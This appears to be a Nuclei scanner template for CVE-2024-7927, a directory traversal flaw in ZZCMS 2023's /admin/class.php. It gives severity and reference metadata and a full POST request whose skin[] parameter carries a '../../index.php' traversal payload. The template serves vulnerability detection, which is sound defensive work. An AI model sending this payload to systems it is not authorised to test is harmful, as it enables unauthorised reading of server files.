id: CVE-2024-7927

info:
  name: ZZCMS 2023 Directory Traversal Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: |
    A critical directory traversal vulnerability in ZZCMS 2023 allows unauthenticated attackers to manipulate the file path in /admin/class.php via the skin[] parameter.
  impact: |
    An attacker can read sensitive files on the server, leading to potential data leakage.
  remediation: |
    Apply the vendor-supplied patch or upgrade to a non-vulnerable version of ZZCMS.
  reference:
    - https://vuldb.com/?ctiid.275113
    - https://vuldb.com/?id.275113
    - https://vuldb.com/?submit.392186
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L
    cvss-score: 7.3
    cve-id: CVE-2024-7927
    cwe-id: CWE-22
    epss-score: 0.0006
    epss-percentile: 0.27347
    cpe: cpe:2.3:a:zzcms:zzcms:2023:*:*:*:*:*:*:*
  metadata:
    vendor: zzcms
    product: zzcms
    fofa-query: zzcms

http:
  - method: POST
    path:
      - "{{BaseURL}}/admin/class.php?dowhat=modifyclass"

    body: |
      parentid=0&oldparentid=0&classname=%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB&oldclassname=%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB&classzm=gsxw&isshow[]=1&title=%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB&keyword=%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB&description=%E5%85%AC%E5%8F%B8%E6%96%B0%E9%97%BB&skin[]=zixun_class.htm&skin[]=zixun_list.htm&classid=1&action=modify&save=+%E4%BF%AE+%E6%94%B9+&skin[0]=../../index.php&skin[1]=

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Directory traversal"
        part: body
